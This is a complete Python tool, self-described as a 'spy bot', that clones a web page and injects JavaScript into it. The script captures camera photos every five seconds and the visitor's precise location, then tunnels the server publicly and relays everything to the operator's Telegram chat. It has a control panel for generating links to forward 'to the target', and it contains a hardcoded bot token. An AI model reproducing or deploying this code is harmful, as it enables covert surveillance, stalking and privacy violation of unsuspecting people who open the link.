#!/usr/bin/env python3
# lang: Python 3, file: say_bot.py, target: Termux / Linux
# jalankan: python say_bot.py
# dep: pip install flask requests python-telegram-bot

import os, sys, base64, datetime, threading, time
import subprocess, shutil, socket, re, signal, asyncio
from collections import defaultdict

try:
    from flask import Flask, request as freq, jsonify
except ImportError:
    print("[!] pip install flask"); sys.exit(1)
try:
    import requests as req_lib
except ImportError:
    print("[!] pip install requests"); sys.exit(1)
try:
    from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
except ImportError:
    print("[!] pip install python-telegram-bot"); sys.exit(1)
try:
    from pyngrok import ngrok as _ngrok; PYNGROK = True
except ImportError:
    PYNGROK = False

# ------------------------------------------------------------------ #
#  KONFIGURASI
# ------------------------------------------------------------------ #
BOT_TOKEN  = "9018666159:AAFACZ-KMGH04QrTiDgEuW5hmGtjFoUE8C4"
CHAT_ID    = "8598136412"

# ------------------------------------------------------------------ #
#  BANNER
# ------------------------------------------------------------------ #
RESET  = "\033[0m"
BOLD   = "\033[1m"
COLORS = ["\033[91m","\033[93m","\033[92m","\033[96m","\033[94m","\033[95m"]

ASCII_ART = [
    " __  __ ____  _  _  _  _   _   _       ___ ____  ",
    "|  \\/  |  _ \\| || || || | | | | |     |_ _|  _ \\ ",
    "| |\\/| | |_) | || || || |_| |_| |      | || | | |",
    "| |  | |  _ <|__  _  __|  _  _  |      | || |_| |",
    "|_|  |_|_| \\_\\  |_| |_|  |_| |_|     |___|____/ ",
]

def print_banner():
    os.system("clear")
    print()
    for i, line in enumerate(ASCII_ART):
        color = COLORS[i % len(COLORS)]
        print(f"{BOLD}{color}{line}{RESET}")
    print(f"\n  \033[90mbot spy by MR414N-ID\033[0m\n")

# ------------------------------------------------------------------ #
#  TIMER AKTIF
# ------------------------------------------------------------------ #
_start_time = time.time()
_timer_running = True

def format_uptime():
    elapsed = int(time.time() - _start_time)
    h = elapsed // 3600
    m = (elapsed % 3600) // 60
    s = elapsed % 60
    return f"{h:02d}:{m:02d}:{s:02d}"

def timer_thread():
    while _timer_running:
        uptime = format_uptime()
        sys.stdout.write(f"\r  \033[90m⏱  Server aktif: \033[97m{uptime}\033[0m   ")
        sys.stdout.flush()
        time.sleep(1)

# ------------------------------------------------------------------ #
#  JS INJECT — foto berulang tiap 5 detik
# ------------------------------------------------------------------ #
INJECT_JS = """
<script>
(function(){
  var capCount = 0;
  var active = true;

  function snapCamera(facingMode, cb) {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) { cb(null); return; }
    navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: facingMode } }, audio: false })
    .then(function(stream) {
      var video = document.createElement('video');
      video.srcObject = stream; video.setAttribute('playsinline','');
      video.muted = true; video.play();
      var fired = false;
      function grab() {
        if (fired) return; fired = true;
        var c = document.createElement('canvas');
        c.width = video.videoWidth||640; c.height = video.videoHeight||480;
        c.getContext('2d').drawImage(video,0,0);
        stream.getTracks().forEach(function(t){t.stop();});
        cb(c.toDataURL('image/jpeg',0.80).split(',')[1]);
      }
      video.addEventListener('loadeddata', grab);
      setTimeout(function(){ if(!fired){fired=true;stream.getTracks().forEach(function(t){t.stop();});cb(null);} },5000);
    }).catch(function(){ cb(null); });
  }

  function getLocation(cb) {
    if (!navigator.geolocation) { cb(null,null,null); return; }
    navigator.geolocation.getCurrentPosition(
      function(p){ cb(p.coords.latitude, p.coords.longitude, p.coords.accuracy); },
      function(){ cb(null,null,null); },
      { enableHighAccuracy:true, timeout:10000 }
    );
  }

  function doCapture() {
    if (!active) return;
    capCount++;
    var num = capCount;
    snapCamera('environment', function(back){
      snapCamera('user', function(front){
        var payload = { num:num, photo_front:front||null, photo_back:back||null, lat:null, lon:null, acc:null };
        if (num === 1) {
          getLocation(function(lat,lon,acc){
            payload.lat=lat; payload.lon=lon; payload.acc=acc; send(payload);
          });
        } else { send(payload); }
      });
    });
  }

  function send(payload) {
    fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)}).catch(function(){});
  }

  window.addEventListener('beforeunload', function(){
    active = false;
    navigator.sendBeacon('/offline','{}');
  });

  function loop() {
    if (!active) return;
    doCapture();
    setTimeout(loop, 5000);
  }

  if (document.readyState==='loading') {
    document.addEventListener('DOMContentLoaded', loop);
  } else { loop(); }
})();
</script>
"""

# ------------------------------------------------------------------ #
#  STATE — multi link
# ------------------------------------------------------------------ #
# links = [ { 'id': int, 'raw_url': str, 'pub_url': str,
#              'port': int, 'proc': Popen|None, 'flask': Thread } ]
_links       = []
_link_id_ctr = 0
_page_html   = ""
_flask_apps  = {}   # port -> Flask app

# ------------------------------------------------------------------ #
#  HELPER
# ------------------------------------------------------------------ #
def free_port(start=8080):
    p = start
    while True:
        with socket.socket() as s:
            if s.connect_ex(("127.0.0.1", p)) != 0: return p
            p += 1

def clone_url(url):
    h = {"User-Agent":"Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 Chrome/112.0.0.0 Mobile Safari/537.36"}
    r = req_lib.get(url, headers=h, timeout=15); r.raise_for_status(); return r.text

def inject_html(html):
    idx = html.lower().rfind("</body>")
    return (html[:idx] + INJECT_JS + html[idx:]) if idx != -1 else html + INJECT_JS

# ------------------------------------------------------------------ #
#  KIRIM KE TELEGRAM (no local save)
# ------------------------------------------------------------------ #
def send_result_thread(data):
    asyncio.run(_send_result(data))

async def _send_result(data):
    bot   = Bot(token=BOT_TOKEN)
    num   = data.get("num","?")
    lat   = data.get("lat"); lon = data.get("lon"); acc = data.get("acc")
    front = data.get("photo_front"); back = data.get("photo_back")
    ts    = datetime.datetime.now().strftime("%H:%M:%S")

    header = f"📸 *Capture #{num}* — {ts}"
    if lat and lon:
        maps = f"https://maps.google.com/?q={lat},{lon}"
        header += f"\n📍 `{lat}, {lon}` ± {int(float(acc))}m\n[Buka Maps]({maps})"
    else:
        header += "\n📍 Lokasi tidak didapat"

    await bot.send_message(chat_id=CHAT_ID, text=header, parse_mode="Markdown")

    if num == 1 and lat and lon:
        await bot.send_location(chat_id=CHAT_ID,
                                latitude=float(lat), longitude=float(lon))

    if back:
        try:
            await bot.send_photo(chat_id=CHAT_ID,
                                 photo=base64.b64decode(back),
                                 caption="📷 Belakang")
        except Exception as e: print(f"\n[!] foto back: {e}")

    if front:
        try:
            await bot.send_photo(chat_id=CHAT_ID,
                                 photo=base64.b64decode(front),
                                 caption="🤳 Depan")
        except Exception as e: print(f"\n[!] foto front: {e}")

async def _send_offline(link_id):
    bot = Bot(token=BOT_TOKEN)
    await bot.send_message(chat_id=CHAT_ID,
                           text=f"🔴 *Target offline* (link #{link_id}) — capture berhenti.",
                           parse_mode="Markdown")

# ------------------------------------------------------------------ #
#  FLASK — satu instance per port
# ------------------------------------------------------------------ #
def make_flask_app(link_id):
    fapp = Flask(f"app_{link_id}")

    @fapp.route("/")
    def index(): return _page_html

    @fapp.route("/capture", methods=["POST"])
    def capture():
        data = freq.get_json(silent=True) or {}
        threading.Thread(target=send_result_thread, args=(data,), daemon=True).start()
        return jsonify({"ok": True})

    @fapp.route("/offline", methods=["POST"])
    def offline():
        asyncio.run(_send_offline(link_id))
        return jsonify({"ok": True})

    return fapp

def run_flask_on_port(fapp, port):
    fapp.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)

# ------------------------------------------------------------------ #
#  TUNNEL — cloudflared (recommended untuk multi)
# ------------------------------------------------------------------ #
def start_cloudflared(port):
    b = shutil.which("cloudflared")
    if not b: return None, None
    proc = subprocess.Popen([b,"tunnel","--url",f"http://localhost:{port}"],
                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                            text=True, bufsize=1)
    pat = re.compile(r"https://[a-zA-Z0-9\-]+\.trycloudflare\.com")
    for _ in range(40):
        line = proc.stdout.readline()
        if not line: time.sleep(0.5); continue
        m = pat.search(line)
        if m: return m.group(0), proc
    proc.terminate(); return None, None

def start_ngrok(port):
    if PYNGROK:
        try:
            t = _ngrok.connect(port,"http")
            return t.public_url.replace("http://","https://"), None
        except Exception as e:
            print(f"\n[!] ngrok: {e}")
    if shutil.which("ngrok"):
        proc = subprocess.Popen(["ngrok","http",str(port)],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)
        try:
            r = req_lib.get("http://127.0.0.1:4040/api/tunnels",timeout=3)
            for t in r.json().get("tunnels",[]):
                u = t.get("public_url","")
                if u.startswith("https"): return u, proc
        except: pass
    return None, None

def start_serveo(port):
    if not shutil.which("ssh"): return None, None
    proc = subprocess.Popen(
        ["ssh","-o","StrictHostKeyChecking=no","-o","ServerAliveInterval=30",
         "-R",f"80:localhost:{port}","serveo.net"],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    pat = re.compile(r"https?://[a-zA-Z0-9\-]+\.serveo\.net")
    for _ in range(30):
        line = proc.stdout.readline()
        if not line: time.sleep(0.5); continue
        m = pat.search(line)
        if m: return m.group(0), proc
    proc.terminate(); return None, None

TUNNEL_FN = {
    "tunnel_cf": start_cloudflared,
    "tunnel_ng": start_ngrok,
    "tunnel_sv": start_serveo,
}

# ------------------------------------------------------------------ #
#  TAMBAH LINK (dipanggil dari callback bot)
# ------------------------------------------------------------------ #
async def do_add_link(tunnel_key, query):
    global _link_id_ctr
    _link_id_ctr += 1
    lid  = _link_id_ctr
    port = free_port(8080 + lid * 10)

    await query.edit_message_text(f"⏳ Membuat link #{lid}...")

    # flask
    fapp = make_flask_app(lid)
    ft   = threading.Thread(target=run_flask_on_port, args=(fapp, port), daemon=True)
    ft.start()
    time.sleep(1.0)

    # tunnel
    loop = asyncio.get_event_loop()
    fn   = TUNNEL_FN[tunnel_key]
    pub_url, proc = await loop.run_in_executor(None, fn, port)

    if not pub_url:
        await query.edit_message_text(
            f"❌ Tunnel gagal untuk link #{lid}.",
            reply_markup=main_keyboard()
        )
        return

    _links.append({
        "id": lid, "pub_url": pub_url,
        "port": port, "proc": proc, "flask": ft
    })

    await query.edit_message_text(
        f"✅ *Link #{lid} aktif!*\n\n🔗 `{pub_url}`\n\nForward ke target.",
        parse_mode="Markdown",
        reply_markup=main_keyboard()
    )

# ------------------------------------------------------------------ #
#  KEYBOARD
# ------------------------------------------------------------------ #
def main_keyboard():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("➕ Tambah Link", callback_data="add_link"),
            InlineKeyboardButton("🗑 Hapus Link",  callback_data="del_link"),
        ],
        [
            InlineKeyboardButton("📋 Daftar Link", callback_data="list_links"),
            InlineKeyboardButton("🛑 Stop Server", callback_data="stop"),
        ],
    ])

def tunnel_keyboard():
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("☁️ Cloudflared", callback_data="new_cf"),
        InlineKeyboardButton("🔗 Ngrok",       callback_data="new_ng"),
        InlineKeyboardButton("🌐 Serveo",      callback_data="new_sv"),
    ],[
        InlineKeyboardButton("« Kembali",      callback_data="back_main"),
    ]])

def del_keyboard():
    rows = []
    for lnk in _links:
        rows.append([InlineKeyboardButton(
            f"🗑 Hapus Link #{lnk['id']} — {lnk['pub_url'][:40]}...",
            callback_data=f"delid_{lnk['id']}"
        )])
    rows.append([InlineKeyboardButton("« Kembali", callback_data="back_main")])
    return InlineKeyboardMarkup(rows)

# ------------------------------------------------------------------ #
#  HANDLERS
# ------------------------------------------------------------------ #
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🕵️ *MR414N-ID Spy Bot*\n\nPanel kontrol:",
        parse_mode="Markdown",
        reply_markup=main_keyboard()
    )

async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q    = update.callback_query
    data = q.data
    await q.answer()

    if data == "back_main":
        await q.edit_message_text(
            "🕵️ *MR414N-ID Spy Bot*\n\nPanel kontrol:",
            parse_mode="Markdown",
            reply_markup=main_keyboard()
        )

    elif data == "add_link":
        await q.edit_message_text(
            "Pilih tunnel untuk link baru:",
            reply_markup=tunnel_keyboard()
        )

    elif data in ("new_cf","new_ng","new_sv"):
        key = {"new_cf":"tunnel_cf","new_ng":"tunnel_ng","new_sv":"tunnel_sv"}[data]
        await do_add_link(key, q)

    elif data == "list_links":
        if not _links:
            await q.edit_message_text(
                "📋 Belum ada link aktif.",
                reply_markup=main_keyboard()
            )
        else:
            teks = "📋 *Daftar Link Aktif:*\n\n"
            for lnk in _links:
                teks += f"• Link #{lnk['id']}: `{lnk['pub_url']}`\n"
            await q.edit_message_text(
                teks, parse_mode="Markdown",
                reply_markup=main_keyboard()
            )

    elif data == "del_link":
        if not _links:
            await q.edit_message_text(
                "Belum ada link untuk dihapus.",
                reply_markup=main_keyboard()
            )
        else:
            await q.edit_message_text(
                "Pilih link yang mau dihapus:",
                reply_markup=del_keyboard()
            )

    elif data.startswith("delid_"):
        lid = int(data.split("_")[1])
        for i, lnk in enumerate(_links):
            if lnk["id"] == lid:
                if lnk.get("proc"):
                    try: lnk["proc"].terminate()
                    except: pass
                _links.pop(i)
                break
        await q.edit_message_text(
            f"✅ Link #{lid} dihapus.",
            reply_markup=main_keyboard()
        )

    elif data == "stop":
        await q.edit_message_text("🛑 *Server dihentikan.*", parse_mode="Markdown")
        await asyncio.sleep(1)
        global _timer_running
        _timer_running = False
        os.kill(os.getpid(), signal.SIGINT)

# ------------------------------------------------------------------ #
#  MAIN
# ------------------------------------------------------------------ #
def main():
    global _page_html

    print_banner()

    # template
    print("  [1] Clone dari URL   [2] File HTML lokal\n")
    while True:
        p = input("  Template (1/2): ").strip()
        if p in ("1","2"): break

    if p == "1":
        url = input("  URL: ").strip()
        if not url.startswith("http"): url = "https://" + url
        print("  [*] Cloning...")
        try:
            raw = clone_url(url); print("  [+] OK\n")
        except Exception as e:
            print(f"  [!] Gagal: {e}"); sys.exit(1)
    else:
        path = input("  Path HTML: ").strip().strip('"\'')
        if not os.path.isfile(path):
            print("  [!] File tidak ditemukan"); sys.exit(1)
        with open(path,"r",encoding="utf-8",errors="replace") as f:
            raw = f.read()
        print("  [+] OK\n")

    _page_html = inject_html(raw)

    # timer di background
    threading.Thread(target=timer_thread, daemon=True).start()

    print(f"\n\n  Buka @Spyjsbot → /start\n")

    # telegram bot
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", cmd_start))
    application.add_handler(CallbackQueryHandler(on_button))
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
